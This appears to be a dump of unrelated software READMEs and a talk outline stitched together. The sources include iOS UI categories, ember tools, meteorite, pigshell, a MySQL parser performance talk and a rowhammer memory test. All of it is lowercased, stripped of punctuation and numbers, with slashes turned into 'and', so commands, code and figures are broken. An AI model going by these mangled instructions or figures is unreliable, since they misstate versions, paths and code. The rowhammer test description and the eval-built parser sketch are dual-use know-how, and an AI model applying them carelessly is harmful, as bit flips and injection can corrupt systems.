1204922, this is a quickie pair of categories on uialertview and uiactionsheet which enables you to use blocks to handle the button selection instead of implementing a delegate how it works  using uialertview as the main example here instead of calling the traditional initwithtitle message delegate cancelbuttontitle otherbuttontitles initializer you call the new initializer initwithtitle message cancelbuttonitem otherbuttonitems this works just like the traditional initializer except instead of using strings for the buttons it takes instances of ributtonitem s this is a class also defined as part of this framework which simply encapsulates the button label and the action block to execute when that button is tapped the last argument to the initializer is variadic just like the traditional initializer so it must be nil terminated the action blocks are of type risimpleaction which is typedef d to be a block as follows typedef void risimpleaction this is just a simple block which takes no arguments and returns nothing the ributtonitem class also provides a convenience method which returns an autoreleased item called conveniently enough and item if you don t specify an action the button will still show but won t do anything when tapped other than dismiss the dialog this is pretty common with cancel buttons so another convenience method called and itemwithlabel allows you to quickly create an item that has no action under the covers the category takes the button items you pass in and it stores them as an associated object with the uialertview itself it then initializes a traditional uialertview setting itself as the delegate when the uialertview gets the alertview diddismisswithbuttonindex delegate method called it pulls out the button items looks up the one associated with the tapped button and executes the block associated with that button one little bit of weirdness you may be curious about is this in the initializer it retains itself the reason it does this is because the expectation is that you ll basically fire and forget this i didn t want to have to hold onto an instance variable for this guy or anything and i wasn t sure if the diddismiss method was called before or after the alertview was removed from the view hierarchy and thus possibly deallocated since the uialertview itself is it s own delegate if it gets deallocated before the diddismiss method is called it would crash and we don t want that by retaining self we don t need to worry about it the only concern then is that we have to remember to release self in the delegate method which we do if anyone can confirm or deny that this code is required i d welcome the discussion does retaining self make me feel dirty yes and naughty oh yeah so naughty how to use it  typically you ll create items that represent the buttons and the actions to take when they are tapped for example imagine a dialog box confirming deletion of an item ributtonitem cancelitem ributtonitem itemwithlabel no action and and this is the code that will be executed when the user taps no and and this is optional if you leave the action as nil it won t do anything and and but here i m showing a block just to show that you can use one if you want to ributtonitem deleteitem ributtonitem itemwithlabel yes action and and this is the code that will be executed when the user taps yes and and delete the object in question context deleteobject theobject the label property on the button items is the text that will be displayed in the button once you ve created these you simply initialize your uialertview using the initializer passing your button items accordingly uialertview alertview uialertview alloc initwithtitle delete this item message are you sure you want to delete this really important thing cancelbuttonitem cancelitem otherbuttonitems deleteitem nil alertview show alternatively you can also use a single line to create buttons and declare the alert view uialertview alloc initwithtitle delete this item message are you sure you want to delete this really important thing cancelbuttonitem ributtonitem itemwithlabel yes action and and handle cancel  otherbuttonitems ributtonitem itemwithlabel delete action and and handle delete  nil show again this is designed to be fire and forget so you initialize it show it and release it it ll take care of cleaning up after itself you can also add a ributtonitem to the uialertview after initialization just like you normally would alertview addbuttonitem deleteitem this is useful if building an uialertview or uiactionsheet dynamically from an array for ributtonitem item in buttonitemarray alertview addbuttonitem item that s it the uiactionsheet category works virtually the same as the uialertview just check out the header for the initializer you need to use it s very straightforward find this useful  why don t you buy me a beer with bitcoin my wallet address is

8134335, ember tools  notice ember tools is not currently maintained if you want to maintain the project contact fivetanley or rpflorence if there is any interest if you re starting a new project using ember cli is recommended instead npm install g ember tools prescribed file organization for sanity scaffolding for learning curve mitigation template precompilation for performance single file application build for convenience generators for faster application development commonjs node style modules current version    package versions ember v   ember data v  handlebars v   jquery    npm install g ember tools ember create my app cd my app ember generate scaffold person name string age number ember build open index html mac os xdg open index html linux start index html windows the first place to get started is configuring a route in config and routes js and then adding a template for the route you can always run ember help or ember command help to get usage information usage ember command options command specific help ember command help commands create options creates a new ember application at dir build options compiles templates and builds the app generate options generates application files precompile options precompile templates from src dir to target dir update version update ember js from ember s s build service to version versions are latest built from master bleeding edge and stable default version is stable options h help output usage information v version output the version number if you are creating a stand alone browser application no server or communication is through some api service then use ember create my app javascript assets created in my app and js ember commands run from my app root or if you already have the my app directory cd into it and call ember create bare ember create javascript assets created in and js ember commands run from and root there is nothing magical about the index html file feel free to replace it with your own you probably should just make sure you include a script tag pointing to js and application js if you are creating an ember app as part of a server side framework like express or ruby on rails use the js path option cd my server app ember create js path public and javascripts javascript assets created in my server app and public and javascripts ember commands run from my server app root running ember build will create a file at public and javascripts and application js require that in your server app s template no other files are required the build command pre compiles all the templates to simple functions assigns all your modules to the app object based on their file names and then creates a single concatenated file to be included in your app ember build this build step makes adding new modules to your app as simple as creating a file with the generate command it will convert the file path to an object ie controllers and recipe app recipecontroller  routes and recipes and index app recipesindexroute to build when files in your app change use the watch option ember build w if you want to inspect the objects being assigned to the app object you can build without cleanup using the no cleanup c option and then opening up the index js file it creates ember build c you can also specify the path of the resulting application file to save it somewhere other than the default path ember build out file public and whatever js of course you can combine any of these options ember build wc out file public and whatever js i am not super proud of the scaffolding but it gets your feet wet with ember really quickly so use it for fun not profit p ember generate scaffold timesheet description string minutes number ember tools provides generators for the different ember objects your app will use basic usage is ember generate options name so creating a recipe route would look like ember generate route recipe or the shorter version ember generate r recipe if you have a route you probably want a template too you can combine generator options ember generate rt recipe below is a list of all generator commands the the files and objects they and options and object name and file and and and and and and model m burrito and burrito and models and burrito js and and view v burrito and burritoview and views and burritoview js and and controller c post and comments

and tacocartroute and routes and tacocartroute js and and mixin x tacoable and tacoable and mixins and tacoable js and and helper l allcaps and allcaps and helpers and allcaps js and models will always be singular sub directories will be created for you if they don t exist components must have a dash per web component standards the build command already pre compiles your templates but you can use the precompile command outside of the rest of ember tools to precompile a bunch of templates found at views and jst to assets and javascripts and templates js run this command ember precompile d views and jst f assets and javascripts and templates js this will register each template on ember templates with file paths for keys  rename ember to ember json  edit ember json to point to the right jspath  should look something like js jspath js  modules cjs  move routes js  app js  and store js to config and filename js  add dependencies to config and app js  it should look something like this require and vendor and jquery require and vendor and handlebars require and vendor and ember require and vendor and ember data var app ember application create app store require and store module exports app that should do it run tests with npm test and the browser sanity tests npm run script browser its usually easiest to create a branch and send a pull request against that branch instead of master single commits are preferred no big deal though i can squash and cherry pick thanks for using ember tools

15371894, grocerylist is a simple iphone application built to serve two basic needs  creating and managing a grocery list  synchronizing synchronization that grocery list between multiple people the app also serves as an example project for a few different frameworks frameworks it is not meant to be feature complete polished or worth any kind of payment if you re only interested in using the app you can jump straight to getting it built using the app the app stores and synchronizes its grocery list using a github repository starting the list  since it s easier than writing a synchronization service and because git and the github means the list is editable from the web without any need to build a custom the grocery list repository follows a fairly simple structure each grocery store is represented by a text file of the same name and those files contain newline separated lists of grocery items for example the repository could be comprised of these files each file will contain items like this crackers peanut butter item names with a tilde on either side crackers in the above example have been crossed off of the list but not yet deleted the same item name may appear in multiple store files those separate entries will be collapsed into one visible item within the app the grocerylist app was built partly as a real world demonstration of several frameworks including specific libraries aside the app also serves as a general example of functional mvvm in cocoa grocerylist is a personal project not an app store quality download to actually use it and share your list with specific people there are a few hoops you ll need to jump through first before anything else make sure to run script and bootstrap in your local copy of the repository this will automatically clone all submodules used in the since the app is built on github synchronization  it requires a github repository that all users you and anyone you want to share the list with will have permission to push to private just keep in mind the privacy setting when adding grocery items or the app you must have at least one file in the repository before using it you can choose to initialize it with a readme or create the file by hand following the list format list format  just as long as the repository is not empty finally add anyone with whom you want to share the list as the repository to be able to log in through the app it must be configured as a github oauth application simply register a new grocery list and and auth as the authorization callback url after registration you ll have to add the client id and secret to the project s build settings required build settings because the author is lazy the project won t build until effectively hardcoded with certain settings this is accomplished with a custom xcode configuration file that is specifically ignored configuration and gitignore by git in your local clone of the repository inside the configuration folder create a file named usersettings xcconfig in it add a line like the following gccpreprocessordefinitions inherited gcylistrepository username and grocery lists gcyclientid gcyclientsecret replace the value of gcylistrepository with the actual full name of the repository containing the list you created starting the list fill in gcyclientid and gcyclientsecret with the details from the oauth application you registered creating an oauth application after the configuration file has been saved you should be able to open the project and build the most straightforward way to get up and running with your customized version of the app is to build it directly to the device of anyone interested in sharing your grocery list however it may be easier over the long term to use a totally optional service distributing builds this project is released under the mit license license md

4789337, meteorite is a meteor package installer it provides an easy way to install meteor packages into your project from sources such as git and the filesystem npm install g meteorite if your system requires root access to install global npm packages make sure you use the h flag sudo h npm install g meteorite list your packages in a smart json file in the top level of the project there are two non deprecated ways to include packages packages my fork local version path to and the and package and install all packages listed in smart json that aren t already installed on your machine use this command if you are working collaboratively and your colleagues install new packages smart lock changes installs any available updates to the app s desired meteor version and packages use this if a new version is available on git for instance links packages and foo to path and to and foo so that you can use a local version without changing smart json useful for quick changes to a package you maintain when developing an application note that mrt install or mrt will overwrite this link if you also have foo in your smart json which you probably will this may change in the future options can be passed at the very end of the command log debug information to the console example mrt add crypto sha verbose as meteorite now installs packages into the packages and directory you can simply run meteor to start your app you may need to run mrt install first you can run any meteor executable you like e g from a checkout somewhere on your machine works like meteor  but checks and installs the app s desired meteor version and package dependencies before running the app you may still want to use this but it s no longer the official way to use meteorite if however you want to use a forked version of meteor in your project you can still list it in your smart json  and meteorite will run it via mrt of course you could just run it directly from a checkout too which may be simpler unlike meteor add  only one package can be added at a time with mrt add mrt add moment mrt add router pkg version    note the packages on the old site are only likely to work with meteor    similarly removes a package from smart json  and unlinks it from your project as well as telling meteor not to use it when meteorite is executed for an app it checks or installs the app s desired meteor version packages and dependencies then does the required book keeping described below  and finally passes the command onto meteor it is not required that you run sudo mrt if you do so your home directory will pick up some root owned files and you ll struggle to run mrt without sudo from then on this isn t good to fix the problem try cleaning up potentially sudo ed files sudo mrt uninstall sudo mrt uninstall system sudo chown r whoami and npm if possible try not to install meteorite as root either if you have permissions problems make sure you install with sudo h npm install g meteorite if you ve installed without h  your and npm directory will be owned by root and you should run the chown command above to fix it apps tell meteorite the meteor version and packages they want with a file called smart json in their root directory meteorite will install those dependencies the next time it is executed within that app meteorite writes to a smart lock file in the app s root directory to track the exact versions of its dependencies even when it s set up in a fresh environment you should check the smart lock file into your app s version control to ensure that other developers are running the same versions of the dependencies any changes in smart json take precendence over smart lock the smart lock file is reset with the mrt update command the meteor property is not required apps will depend on meteor s master branch by default you can specify meteor branch  meteor tag or meteor git to use alternate branches tags and forks respectively note that meteor git expects an actual url use ssh and and git github com and meteor and meteor git instead of git github com meteor and meteor git packages moment  router     roles version    accounts persona normalize css tag v   branch of package branch dev my experiment path and path and to and local and package use meteorite s bash completion by sourcing it in your bashrc or bashprofile depending on where you installed meteorite if f and path and to and meteorite and completions and mrt bash then and path and to and meteorite and completions and mrt bash alternatively you can create a symbolic link under bashcompletion d ln s and path and to and meteorite and completions and mrt bash and path and to and bashcompletion d and mrt if you encounter checkout errors while running mrt install or mrt update within a git hook script it is because gitdir is set to an unexpected value when running within a hook the solution is to temporarily unset it just before running the mrt command unset gitdir mrt update

4351782, a tweetbot like notice component for ios drop the wbnoticeview folder in your project add quartzcore framework to your project first and foremost please note that in v  the api has changed instead of deprecating and complicating the api it was decided to replace some of the methods noticeview is a tiny library so the impact should be minimal and the code easy to adapt why the change prior to v  it was fairly difficult to customize the look and feel given the current structure of the notice classes this version simplifies that task improves accessibility and enhances the utility of the tap to dismiss functionality here is the brief of the changes introduced in v  adds a podspec file to the repository it s now easier to customize noticeview tap to dismiss behaviors are much more flexible it s possible to determine if a notice was dismissed interactively in the dismissal block allowing for growl style notifications that can be responded to on tap or automatically dismissed notices can also be optionally dismissed via tap before the display duration has expired acknowledgments big thanks to blakewatters for taking the time to refactor document and cleanup the code starting with   any notice can have a completion block associated with it this block will be invoked when the notice has been dismissed works on sticky and non sticky notices wberrornoticeview

yes notice dismissedblock nslog the notice has been dismissed starting with    any notice with the sticky property set can be dismissed at will this could happen for example when an specific event is detected just invoke dismissnotice on the notice whenever you re ready to dismiss it mynotice dismissnotice check the demo project to see it in action some users have asked whether sticky could be a property of any notice view well i m happy to report that starting with version   all notice types can be made sticky the usage follows the regular pattern only this time we set the sticky property accordingly wberrornoticeview notice wberrornoticeview errornoticeinview self view title network error message check your network connection notice sticky yes notice show new in   is a different type of notice sticky as it name implies the notice will remain visible until the user taps on it to dismiss it the usage follows the error and success notice pattern wbstickynoticeview notice wbstickynoticeview stickynoticeinview self view title  new tweets notice show the behavior in version  was fire and forget calling showerrornoticeinview or showsuccessnoticeinview displayed the notice but there was no way to retain it for later use version  allows the developer to instantiate a notice customize it optional and show it not only it s possible to retain it but also customize it anytime with say a different title and message oh yeah and it s cleaner too since version  is more flexible i have eliminated the older examples and replaced them with the new api please note that the older api is still there for backward compatibility to display a small error notice wberrornoticeview notice wberrornoticeview errornoticeinview self view title network error message check your

21982886, unix the web in the browser which presents resources on the web as files these include public web pages as well as private data in google drive dropbox facebook and even your desktop it provides a command line interface to construct pipelines of simple commands to transform display and copy data pigshell is free software  released under the gnu gplv pigshell is inspired by unix philosophy everything is a file programs should do one thing well create tools by stringing together a combination of simpler tools like human language clis give us freedom of expression we can generate infinite meaningful combinations from a limited number of words to effectively deal with the combinatorial explosion of variety thrown up by the modern web environment backup google drive to your desktop cp rv and gdrive and username and home mount multiple google drive and dropbox accounts copy files from anywhere to anywhere plot your friends locations on a map map and facebook and friends and early  versions of chrome firefox and safari should work fine on all desktop platforms mobile browsers internet explorer and others are not supported at the moment running the psty src and doc and psty md server on your desktop is strongly recommended it exposes a local directory for pigshell to use as a and home  serves as a proxy http server and lets pigshell pipe web data through desktop unix utilities psty works only on unix currently click on the first example in the sidebar or type the following at the prompt life expectancy and images and screenshots and helloworld jpg we got a page from a website extracted a table converted it to a list of javascript objects and fed it to a d based template for visualization a pigshell pipeline lazily processes streams of objects commands should be considered as generator functions yielding objects composed using the pipe operator the pipeline starts when the last member an implicit stdout asks the upstream command for an object which in turn asks its upstream command and so on until the command at the head reluctantly yields an object it is processed and returned downstream until it hits stdout which displays it on the terminal stdout has an insatiable appetite for objects so it asks for one more and the process continues until a null object signifying the end of the pipeline makes its way down unlike unix commands pigshell commands are not independently executing processes the terminal should be familiar to unix and bash users featuring tab completion history and emacs style cli editing shortcuts the primary prompt is pig basenameofcwd when a command is running a secondary prompt of is displayed which can be used to typeahead commands ctrl c and ctrl z kill and pause the current foreground command respectively while ctrl b backgrounds it roughly like an ctrl z and bg in bash a command sequence e g ls and sum sleep  echo done issued on the cli will fill its output area as and when objects are emitted the prompt associated with a command sequence glows green or amber while it is running or stopped and on its completion settles to red or black depending on its exit status ls  cd  mount  cat work similarly enough to their unix namesakes to help you explore the system the ps command displays a list of running pipelines to kill a long running pipeline use ps to find its pid and kill you can also stop and start pipelines many commands support a f option to use a given object field and e to specify a javascript expression for instance ls and gdrive and username gmail com and grep f mime spreadsheet and grep e x mtime date parse dec   and cp the above command finds all files in the given user s gdrive containing the string spreadsheet in their mime property selects those files which those files modified since dec   and copies them to the current directory to attach google drive picasa dropbox facebook click on the corresponding icon under data source in the sidebar attaching an account automatically mounts associated filesystems under and gdrive  and picasa  and dropbox and and facebook respectively data privacy is assured pigshell is a pure javascript app and data flow happens directly between your browser and data sources like google and facebook no access tokens or user data are ever visible to or stored by the pigshell com server running the mount command without arguments displays the list of currently mounted filesystems note may  the facebook api no longer supplies the entire friends list only those who have used and approved the pigshell app this breaks a lot of the functionality described in the facebook section and will be modified in later revisions of this document everything is a file friends are files too after attaching your facebook cd and facebook and friends ls will give you a list of your friends where in the world are my friends map and facebook and friends and friends map and images and screenshots and mapfriends jpg map is a command which plots files with location attributes on a map another way of doing this would be ls and facebook and friends and and map pigshell passes objects over pipes in this case ls emits a stream of file objects which are consumed by map let s refine the above query where are all my male friends ls and facebook and friends and grep f gender male and map grep is a generic filter command which may filter either by an object s text representation or a specific field in this case gender how many friends do i have ls and facebook and friends and sum pie chart of relationship status of all female friends ls and facebook and friends and grep f gender female and chart t pie o field relationshipstatus python psty py a d and some and dir run in desktop shell bash  not pigshell and on pigshell the psty server runs only on linux and mac os at present it has been reported to work on windows using cygwin now you can read and write to and home it will be backed by and some and directory cat images and pdfs stored on your desktop inside and some and directory this mount command needs to be typed every time you start or reload the page to do it automatically and local and rc sh is a script stored in the browser s localstorage and will be and local and rc sh on every browser on which you use pigshell assuming you re running psty backing up google drive to your desktop is as simple as mkdir and home and drivebackup cp rv x and trash and gdrive and username gmail com and home and drivebackup more details on using google drive src and doc and gdrive md with pigshell backing up a picasa album mkdir and home and foo cp and picasa and foo and and home and foo similarly creating an album and uploading a bunch of pictures to picasa mkdir and picasa and bar cp and home and barpics and jpg and picasa and bar note that album creation and uploads to picasa require psty s proxy services copying random urls to your desktop also works the c option continues where it left off so you can resume interrupted downloads if you don t have psty you can copy the files to and downloads  and it will get to your browser s default download folder note that you cannot see anything inside the and downloads directory it s just a pseudo target to trigger a browser download for example cp and picasa and foo and dsc jpg and downloads click on upload files and select a file or files from your desktop these files are now visible under the directory and uploads use ls to verify that they re there now use cp to copy them to the target directory cp and uploads and cat jpg and gdrive cp and uploads and cat jpg and facebook and me and albums and mycat and most filesystem read operations generate blobs it is up to the consuming command to convert incoming data into the type it likes in the command cat returns a blob the terminal figures out that the blob contains png data and displays it as a canvas similarly is detected as a pdf and displayed using pdf js in case it could not figure out the contents it attempts to convert it to text and displays it as the usual weird character porridge though it is mercifully silent unlike unix terminals in some cases you have to manually convert data between stages in the pipeline for example implements a poor man s wc cat returns a blob to converts it to text jf splits it into lines sum counts the number of objects it gets a cat and sum would have returned  since only one object a blob was presented to sum absolute urls can be used in most places where a file path is expected mounting an http url exposes all links within that page as directories to mount arbitrary non cors enabled urls you need to run psty cat oslogos png cat cat and to text psty runs a websocket service effectively converting any unix utility which uses stdin and stdout into a potential member of the pigshell pipeline for instance if you have imagemagick installed will grab a png file from the web pipe it through imagemagick on the desktop and display the result in pigshell implode and images and screenshots and implode jpg to visualize disk usage in a zoomable treemap wsh du and users and foo and to g text and iframe and usr and template and d du treemap du treemap and images and screenshots and du treemap png note that du of a deep tree may take a while try with a shallow directory tree first pigshell is under active development no commands apis or interfaces are frozen at this point tests and documentation are very sparse at the moment the user guide src and doc and pigshell md has more detailed coverage of pigshell concepts and the scripting language

5966205, this document contains the outline and code snippets for my  jsconf eu talk today i d like to talk about faster than c parsing node js streams before i get started i would like to appologize for the title bait this talk is analyzing the performance of javascript vs c bindings for mysql in node js but not javascript vs c itself so i have this module i wrote that lets you talk to mysql databases in node js i started it because in early  there were no mysql modules for node js well that s not quite true there was one however there was something interesting about it it was written in javascript i mean just javascript no c and c and and in fact it was even crazier because when that module was started node js did not have buffers so this guys was doing all the mysql parsing using javascript strings wtf btw here is a piece of node js trivia did you know that buffer was originally named blob in node js thinking about it blob would have been a much better name for it because buffer can have so many other meanings unfortunately the name blob died at a very young age merely  minutes and oh well rip blob anyway back to mysql so masui s module was really inspiring for me before i saw it i thought the only way to get mysql working was to bind to libmysql however the problem is that libmysql is a blocking library and the mechanics of integrating a blocking library with node were not very clear back then so in a rather compulsive move i was like fuck this and started to write a new mysql client from scratch i did not continue with masui s code base because it was based on strings anyway over a time span of about  months this code base turned into a working library called but you know how it is in this universe no good deed goes unpunished newton already discovered this in  and is now known as the third law of when a first body exerts a force f on a second body the second body simultaneously exerts a force f  f on the first body this means that f and f are equal in magnitude and opposite in direction now of course github did not exist back then but i m pretty sure that if it did newton would have become a programmer and he would have discovered something like this when a first person pushes a library l into a remote repository a second person simultaneously starts working on a second library l which will be equally awesome but in a different way third law of github his library had a few disadvantages compared to mine but it was awesome by being much faster this benchmarks shows the performance of parsing   rows and  mb of network data from the mysql server initially i thought fuck of course libmysql is written in c that s why oleg s library is much faster maybe i can optimize mine and get another   performance boost but there is no way i can get a  increase but wait wasn t v supposed to turn my code into assembly and was it not supposed to be insanely fast and wasn t node going to solve all of my problems anyway had i been lied to well of course i had been lied to node and v don t make shit go fast they are just tools very capable tools sure but you still need to do the work so after i overcame my initial resignation i set out to make my parser faster the current result of that is node mysql  x which can easily compete against libmysql but again it didn t take long for the third law of github to kick in again and and yet again it was an amazing performance improvement as you can see in this graph mariasql is kicking the shit out of my library so fuck maybe it s time to finally give up and accept that i cannot compete with a well engineered c binding c must be faster after all well fuck this this is unacceptable fuck this c is the only choice if you want the best performance type of thinking i want javascript to win this not because i like javascript oh it can be terrible i want javascript to win this because i want to be able to use a higher level language without worrying about performance so i am hacking on a new parser again and from the looks of it it will allow me to be as fast as the mariaqsql library of course the rd law of github would predict that this won t last very long however i don t think that will be the case this time i think we are approaching the endgame the engame is the point where the main bottleneck will be the cost of turning network data into javascript objects this cost is equal for javascript libraries as well as for c and and addons making v calls also when a single client can process  mbit and s utilizing a single cpu your mysql server has long exploded so finally we should be able to consider database drivers a solved problem as far as performance is concerned anyway who cares let s stop talking about my unfinished new parser and mysql let s talk about writing fast javascript programs and what works and what does not the natural tool people reach for when fixing performance problems is the profiler in node this is done by starting your program with node prof which creates a v log file which you can then analyze with node and deps and v and tools and mac tick processor this only works if you have d  the v command line interpreter in your path  but whatever you will get an analysis of what functions are consuming a high percentage of time ticks in your program this works really well if your performance is lost in a small function performing an inefficient algorithm with many iterations the profiler will tell you about this function you fix the algorithm and you win but life is never this easy your code may not be very profilable this was the case with my mysql    library my parser was basically one big function with a huge switch statement i thought this was a good idea because this is how ryan s http parser for node looks like and being a user of node i have a strong track record for joining cargo cults anyway the big switch statement meant that the profiler output was useless for me parser parse was all it told me about so this is when i discovered that profiling is a very limited tool it works in some situations but in my case and many other cases it provided very little another thing that does not work is taking performance advise from strangers and by strangers i mean anybody who is not deeply familiar with your exact problem sure the vm engineers you will meet at this conference are amazing and they will be able to give you many good ideas and inspiration however applying this knowledge blindly is never going to result in good performance so stop listening to specific performance tips and instead listen to this while working on my module i have only found one technique that continuously produced good results for me benchmark driven development so what is benchmark driven development and how can you use it to write very fast javascript programs well first of all you have to accept that speeding up your current code base will be very very hard if performance is a really important design goal for you you have to integrate it into your development work flow from the beginning this is very similar to test driven development where you write tests from the beginning to achieve a high level of correctness in your software so how does benchmark driven development work well you start by creating a function you want to benchmark let s call it benchmark function benchmark and and intentionally empty now you write a benchmark for it while true var start date now benchmark var duration date now start console log duration congratulations you have just written the fastest function in the world unfortunately it does not do anything so the next step is to implement the minimal amount of code that is useful to you for the mysql protocol this would mean parsing the packet headers while you do this keep running the benchmark and tweak your code trying to make it stay fast while adding features doing this will allow you to gain an intuitive understanding of the performance impacts your coding decisions really have you will learn that most performance tips you have heard of are complete bullshit in your context and some others produce amazing results here are a few things i learned from applying this technique but they are just examples please do not attempt similar optimizations unless you are solving the same problem as me try catch is ok big switch statements bad function calls are really cheap buffering and concatenating buffers is ok eval is awesome when using its twin new function  eval itself sucks here is the eval example function parserow columns parser var row for var i  i columns length i and and row columns i name parser readcolumnvalue turns out this can be made much faster by doing this var code return n columns foreach function column code and and column name and and parser readcolumnvalue  n code and n var parserow new function columns  parser  code this optimization turned out to be a huge success and it s what allowed my new parser to gain another  of performance after being very fast already of course this could turn into a security problem but that can be easily fixed by escaping the column name properly the next thing you should do is analyze your data and for the love of god please don t use a benchmarking library that mixes benchmarking and analysis into one step this is like a putting sql queries into your templates don t no a good benchmark produces raw data for example tab separated values work great each line should contain one data point of your benchmark along with any metrics you get can from your virtual machine or operating system pipe this data into a file for   minutes now that you have the raw data start to analyze it the r language is a great tool for this try to automate it as much as possible my flow is like this use the unix tee program to watch your output and record to a file at the same time pdfs into pngs or similar for the web use makefiles to automate your benchmark analysis pipeline so why should you analyze and graph your data can t i just use the median well no otherwise you end up with bullshit in fact all of the benchmark graphs i have shown you so far are complete bullshit remember the benchmark showing the performance of my new parser well let s look at it another way here is a jitter plot ok looks like we have a problem why are there two clusters of data points in each benchmark well let s look at this data another way so it seems like performance starts out great but then something happens and things go to hell well i m not sure what it is yet but i have a strong suspect let s have a look at this graph showing the heap used as you can see it seems during the same moment our performance goes to shit v decides to give more memory to our programs before performing garbage collection this can also be seen when looking at the heap total so chances are good that v is making the wrong call by growing the heap total here there is also a good chance i m still doing something stupid either way i have identified a significant problem in my quest for performance and i can now try to fix it and now you know almost everything there is to know about writing high performance javascript  write a benchmark  write and change a little code  collect data  find problems  goto  that s all i got thank you
20613327, circularprogressdrawable  a drawable with capabilities to indicate progress why a drawable  if you want to achieve interesting effects and animations on android a surprisingly easy and fast way to achieve it is subclassing a drawable instead of subclassing a button or an imageview in order to implement advanced behavior over the drawable you can still implement your own animations by using android animations framework or by the use of listeners on the views you are using dependency groupid com sefford and groupid version   and version type aar and type and dependency groovy compile com sefford circular progress drawable   aar composition  the circular progress drawable is made out of three differentiated components the first one is what is known as the inner circle the radius of the drawable and can be scaled up and down to achieve a progress effect or to serve a background for a textview on top to indicate its meaning the next is the outline ring this ring will surround the inner circle and it is intended as a subtle cue of the empty state of the progress the last is the outer ring it will be used for several purposes the first is to show the progress of the drawable in the current version the progress ring is filled from the bottom and counter clockwise circular progress drawable can be defined programatically and the only parameters it will require will be the different colours and the size of the outer ring scale property for the inner ring can be used to achieve a variety of effects as pulsating effects overshoot or to make it disappear completely the drawable allows both for a progress and an indetermination mode in the indetermination mode instead of filling the outer ring a  arc will be shown that can be animated to spin around the inner circle overshoot example overshoot gif colorfill example colorfill gif take advantage of the android animators to achieve a variety of effects around circular progress drawable if you want more interesting feedback you can use ontouchlisteners over your view have a look at the sample for some ideas if you rely on animators for animation and your application is obfuscated using proguard be advised that your circular progress drawable animations could stop working in order to avoid that add keepclassmembers class com sefford circularprogressdrawable circularprogressdrawable to your proguard conf file copyright  sefford licensed under the apache license version   the license you may not use this file except in compliance with the license you may obtain a copy of the license at unless required by applicable law or agreed to in writing software distributed under the license is distributed on an as is basis without warranties or conditions of any kind either express or implied see the license for the specific language governing permissions and limitations under the license

28887177, rowhammer is a problem with recent dram modules in which repeatedly accessing a row of memory can cause bit flips in adjacent rows this repo contains a program for testing for the rowhammer problem which runs as a normal userland process the rowhammer problem is described by yoongu kim et al s paper flipping bits in memory without accessing them an experimental study of dram disturbance  our blog post exploiting the dram rowhammer bug to gain kernel   on the blog of google s project zero how to run the test and make sh and rowhammertest the test should work on linux or mac os x it works on x only either x  or x   because it relies on x s clflush instruction for flushing cache lines warning  we are providing this code as is you are responsible for protecting yourself your property and data and others from any risks caused by this code this code may cause unexpected and undesirable behavior to occur on your machine this code may not detect the vulnerability on your machine be careful not to run this test on machines that contain important data on machines that are susceptible to the rowhammer problem this test could cause bit flips that crash the machine or worse cause bit flips in data that gets written back to disc warning  if you find that a computer is susceptible to the rowhammer problem you may want to avoid using it as a multi user system bit flips caused by row hammering breach the cpu s memory protection on a machine that is susceptible to the rowhammer problem one process can corrupt pages used by other processes or by the kernel we invite people to post results from this test on the following mailing list this mailing list is intended to be used for reporting experimental results discussing avenues of exploitation for rowhammer induced bit flips discussing mitigations any other discussion of the rowhammer problem a row hammering attempt involves picking two or more memory locations and then accessing them uncached repeatedly if the locations are in different rows of dram but in the same bank this will cause the rows to be activated repeatedly it is these repeated row activations that can cause bit flips in adjacent rows we use a probabilistic approach for picking memory locations we can simply pick random pairs of addresses and retry repeatedly if a machine has  banks of dram there should be a  and  chance that the two addresses chosen map to the same bank for example some machines that i ve tested contain  dram modules with  banks each this probabilistic approach means that the test doesn t need to know how the cpu s memory controller maps physical addresses to dram row and column numbers and it doesn t need to know the physical addresses of the memory it has allocated the test allocates a large block of memory it repeatedly picks  random addresses within the block hammers them and then checks the block for bit flips if it sees a bit flip it exits if it never sees a bit flip it will run forever

and outputting results in a variety of formats comparison to other integration test frameworks  how is subliminal different from other integration test frameworks most other integration test frameworks fall into two categories entirely objective c based or entirely uiautomation based touch handling system using private apis to simulate user interaction there is thus no guarantee that they accurately simulate a user s input moreover these frameworks can only simulate interaction with the application as opposed to interaction with the device other processes like in app purchase alerts etc frameworks that are entirely based on apple s uiautomation framework require cumbersome workflows writing tests in javascript in instruments which do not make use of the developer s existing toolchain moreover they offer the developer no means of manipulating the application directly it is a complete black box to a uiautomation based test only subliminal combines the convenience of writing tests in objective c with the power of uiautomation how is subliminal different than uiautomation besides the limitations of uiautomation described above it is extremely difficult to write uiautomation tests this is because uiautomation requires that user interface elements be identified by their position within the var cell uiatarget localtarget frontmostapp mainwindow tableviews  cells foo these references are not only difficult to read but are also difficult to write to refer to any particular element you have to describe its entire ancestry while including only the views that uiautomation deems necessary images yes accessible elements maybe private uiwebview subviews sure uiautomation based tests are not meant to be written but to be recorded using instruments this forces dependence on instruments and makes the tests difficult to modify thereafter subliminal allows developers to identify elements by their properties independent of their position in the element hierarchy objc slelement foocell slelement elementwithaccessibilitylabel foo subliminal abstracts away the complexity of uiautomation scripts to let developers focus on writing tests subliminal also fixes several bugs in uiautomation and the instruments cli tool and last but not least subliminal rewrites instruments output using human friendly formatting and ansi colors contributing  with help

10287083, ground control is a go based daemon that runs on your pi and lets you manage and monitor it with ease update i just pushed want to hack on the ui part of groundcontrol development then transfer it to your pi scp groundcontrol v   tar gz pi user pihost or download it directly on your pi on the pi extract and change directories tar zxvf groundcontrol    tar gz cd groundcontrol    and run ground control with a simple command you should have config json sample there for a quick start and groundcontrol config myconfig json you can access the ui from your browser on port  for configuration use groundcontrol json sample as a basis and make sure to customize these fields librato you can make a free account at tempodb you can make a free account at graphite or hostedgraphite you can use your own standard graphite server or you can make a  day trial account at prefix important for prefix specify a trailing dot and postfix a leading dot  if you want them here s a typical graphite config graphite prefix prefix or key  postfix ip pi  linerec localhost  make sure to go over the plans paid and free and see what fits you both librato and tempodb were included because they have different retention and resolution and features for the free plans next up set up your controls this is where you input a label and an on  off  once commands to automatically build a gui around it here is an example of having an xbmc control it allows for shutting down and turning on xbmc javascript controls xbmc on and etc and init d and xbmc start  off and etc and init d and xbmc stop you might want to use an init d or upstart script to keep groundcontrol up at all times an default init d script is included here support and init d and groundcontrol place your groundcontrol folder at and opt and groundcontrol and and configuration should be at and etc and groundcontrol json you can edit your support and init d and groundcontrol if you want to modify these paths after you ve verified and etc and init d and groundcontrol start to be working to set up the default run order you can use update rc d groundcontrol defaults q is this specific to the raspberrypi a nope mechanically it was built to work on any unix like environment just in case however the fact that go makes such a slim resource profile and a cross compilation toolkit that works well makes it perfect for it takes very little resource q why was this made a so here we go for fun as said here 